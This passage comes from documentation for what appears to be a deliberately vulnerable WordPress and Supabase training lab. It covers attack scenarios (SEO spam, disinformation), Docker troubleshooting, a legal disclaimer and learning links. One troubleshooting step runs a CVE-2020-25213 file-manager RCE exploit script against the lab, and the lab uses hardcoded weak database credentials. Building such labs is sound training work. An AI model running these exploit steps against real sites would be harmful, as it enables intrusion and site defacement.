+- Brand reputation destroyed
+- Loss of customer trust
+- Potential lawsuits
+
+#### Scenario 3: SEO Poisoning & Spam
+
+**Attacker Goal:** Inject spam content for profit
+
+**Attack Chain:**
+1. Exploit CVE-2019-9978 (Social Warfare RCE)
+2. Create hundreds of spam posts
+3. Promote gambling/pharmaceutical links
+4. Delete legitimate content
+5. Manipulate search rankings
+
+**Business Impact:**
+- Google penalty → search ranking loss
+- Traffic drop → revenue loss
+- Clean-up costs (remove spam, restore content)
+- SEO damage takes months to recover
+
+#### Scenario 4: Political Manipulation
+
+**Attacker Goal:** Spread disinformation
+
+**Attack Chain:**
+1. Exploit WordPress CVEs
+2. Create fake news articles
+3. Promote to homepage with fake popularity
+4. Add fake comments supporting narrative
+5. Social media sharing amplifies reach
+
+**Business Impact:**
+- Brand reputation destroyed
+- Legal consequences (defamation, election interference)
+- Loss of credibility
+- Government investigation
+- Platform bans
+
+---
+
+## 7. Troubleshooting
+
+### Port Conflicts
+
+**Problem:** Port already in use
+
+**Solution:**
+```bash
+# Find what's using the port
+sudo lsof -i :80
+sudo lsof -i :8080
+sudo lsof -i :54321
+
+# Kill the process
+sudo kill -9 <PID>
+
+# Or change port in docker-compose.yml
+```
+
+### Supabase Not Starting
+
+**Problem:** Supabase services fail to start
+
+**Solution:**
+```bash
+# Stop all Supabase instances
+supabase stop --no-backup
+
+# Check for duplicate projects
+docker ps -a | grep supabase
+
+# Stop duplicate Supabase projects
+supabase stop --project-id managment
+
+# Clean up ports
+./scripts/stop.sh
+
+# Start fresh
+./scripts/deploy.sh
+```
+
+### Docker Build Fails
+
+**Problem:** Web app container build fails
+
+**Solution:**
+```bash
+# Check Docker is running
+docker info
+
+# Clean Docker cache
+docker builder prune -a
+
+# Remove old images
+docker images | grep vulnapp
+docker rmi <IMAGE_ID>
+
+# Rebuild with no cache
+cd project-management
+docker build --no-cache -t vulnapp-webapp .
+```
+
+### WordPress Database Connection Error
+
+**Problem:** WordPress can't connect to MySQL
+
+**Solution:**
+```bash
+# Check MySQL is running
+docker ps | grep mysql
+
+# Wait longer (MySQL takes 30-60 seconds)
+sleep 60
+
+# Check MySQL logs
+docker logs wordpress-mysql
+
+# Restart WordPress after MySQL is ready
+docker-compose restart wordpress
+```
+
+### Nginx Proxy Manager 502 Bad Gateway
+
+**Problem:** NPM returns 502 when accessing proxy hosts
+
+**Solution:**
+```bash
+# Check webapp container is running
+docker ps | grep webapp
+
+# Check containers are on same network
+docker network inspect vulnapp-network
+
+# Reconnect container to network
+docker network connect vulnapp-network vulnapp-webapp
+
+# Check NPM logs
+docker logs nginx-proxy-manager
+```
+
+### WordPress Exploit Doesn't Work
+
+**Problem:** CVE exploit script fails
+
+**Solution:**
+```bash
+# 1. Verify plugin is installed and activated
+docker exec vulnerable-wordpress wp plugin list --allow-root
+
+# 2. Check plugin version (must be vulnerable version)
+docker exec vulnerable-wordpress wp plugin get wp-file-manager --field=version --allow-root
+
+# 3. Test endpoint accessibility
+curl http://localhost:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
+
+# 4. Check Python dependencies
+pip3 install requests beautifulsoup4
+
+# 5. Run exploit with verbose output
+python3 wordpress/exploits/cve-2020-25213-file-manager-rce.py http://localhost:8080 -v
+```
+
+### Can't Access from Remote Computer
+
+**Problem:** Services only accessible from localhost
+
+**Solution:**
+```bash
+# 1. Check firewall (Linux)
+sudo ufw status
+sudo ufw allow 80/tcp
+sudo ufw allow 81/tcp
+sudo ufw allow 8080/tcp
+
+# 2. Verify Docker is listening on all interfaces
+sudo netstat -tlnp | grep :80
+
+# 3. Update hosts file on remote computer
+# Add: <SERVER_IP>    project.tujuh wordpress.tujuh
+
+# 4. Configure Nginx Proxy Manager
+# Use server IP in proxy configuration
+
+# 5. Update .env.production
+VITE_SUPABASE_URL=http://project.tujuh/api
+```
+
+### WordPress URL Not Configured
+
+**Problem:** WordPress has wrong URL after installation
+
+**Solution:**
+
+**Best Practice:** Always install WordPress using the NPM domain (`http://wordpress.tujuh`) to avoid this issue.
+
+If you accidentally installed via `http://localhost:8080`, manually fix it:
+
+```bash
+# Check current URL configuration
+docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
+  -e "SELECT option_name, option_value FROM wp_options WHERE option_name IN ('siteurl', 'home');"
+
+# Manual fix - Update to NPM domain
+docker exec wordpress-mysql mysql -u wordpress -pvulnerable_wp_pass wordpress \
+  -e "UPDATE wp_options SET option_value='http://wordpress.tujuh' WHERE option_name IN ('siteurl', 'home');"
+
+# Or fix via WordPress admin panel
+# 1. Login to WordPress admin
+# 2. Go to Settings → General
+# 3. Update WordPress Address (URL) and Site Address (URL) to http://wordpress.tujuh
+# 4. Save Changes
+```
+
+---
+
+## 8. Legal Disclaimer
+
+### ⚠️ **CRITICAL LEGAL NOTICE**
+
+This repository contains **INTENTIONALLY VULNERABLE** applications designed exclusively for:
+
+✅ **Authorized Use:**
+- Educational purposes in controlled environments
+- Security research and training
+- DevSecOps assignments and labs
+- Penetration testing practice in isolated networks
+- Understanding defensive security concepts
+- Demonstrating vulnerability impact
+
+❌ **STRICTLY PROHIBITED:**
+- Testing on systems you don't own
+- Deployment on public internet
+- Use against production systems
+- Unauthorized access attempts
+- Malicious purposes
+- Testing without explicit written permission
+- Sharing exploits for harmful purposes
+
+### Legal Consequences
+
+**Unauthorized access to computer systems is illegal in most countries:**
+
+- **United States:** Computer Fraud and Abuse Act (CFAA) - Up to 20 years imprisonment
+- **European Union:** Directive 2013/40/EU - Criminal penalties
+- **United Kingdom:** Computer Misuse Act 1990 - Up to 10 years imprisonment
+- **International:** Council of Europe Convention on Cybercrime - Extraditable offense
+
+**Additional Liability:**
+- Civil lawsuits for damages
+- Professional license revocation
+- Termination from employment/education
+- Permanent criminal record
+
+### Responsible Disclosure
+
+If you discover vulnerabilities in real systems:
+
+1. ✅ DO NOT exploit vulnerabilities
+2. ✅ Report to the organization privately
+3. ✅ Allow reasonable time for patching (typically 90 days)
+4. ✅ Follow coordinated vulnerability disclosure
+5. ✅ Use bug bounty programs if available
+
+**Report vulnerabilities to:**
+- HackerOne: https://www.hackerone.com/
+- Bugcrowd: https://www.bugcrowd.com/
+- CERT/CC: https://www.kb.cert.org/vuls/
+
+### Ethical Use Agreement
+
+By using this repository, you agree to:
+
+1. Use ONLY in isolated lab environments
+2. Never deploy on public networks
+3. Practice responsible disclosure
+4. Follow ethical hacking principles
+5. Comply with all applicable laws
+6. Not hold the authors liable for misuse
+
+**Remember:** With great power comes great responsibility. Use these tools ethically and legally.
+
+---
+
+## Additional Resources
+
+### Security Learning
+- **OWASP Top 10:** https://owasp.org/www-project-top-ten/
+- **OWASP Testing Guide:** https://owasp.org/www-project-web-security-testing-guide/
+- **PortSwigger Web Security Academy:** https://portswigger.net/web-security
+- **HackTheBox:** https://www.hackthebox.com/
+- **TryHackMe:** https://tryhackme.com/
+
+### WordPress Security
+- **WPScan:** https://wpscan.com/
+- **WordPress Security Whitepaper:** https://wordpress.org/about/security/
+- **Wordfence Blog:** https://www.wordfence.com/blog/
+
+### CVE Databases
+- **NIST NVD:** https://nvd.nist.gov/
+- **CVE Details:** https://www.cvedetails.com/
+- **Exploit-DB:** https://www.exploit-db.com/
+- **MITRE CVE:** https://cve.mitre.org/
+
+### Docker & DevOps
+- **Docker Documentation:** https://docs.docker.com/
+- **Docker Compose Reference:** https://docs.docker.com/compose/
+- **Supabase Documentation:** https://supabase.com/docs
+
+---
+
+**Last Updated:** October 18, 2025  
+**Version:** 2.0  
+**Maintainers:** DevSecOps Lab Team  
+
+**Questions or Issues?** Open an issue on the repository or consult the individual README files in each directory.
+
+---
+
+**Happy Ethical Hacking! 🛡️**
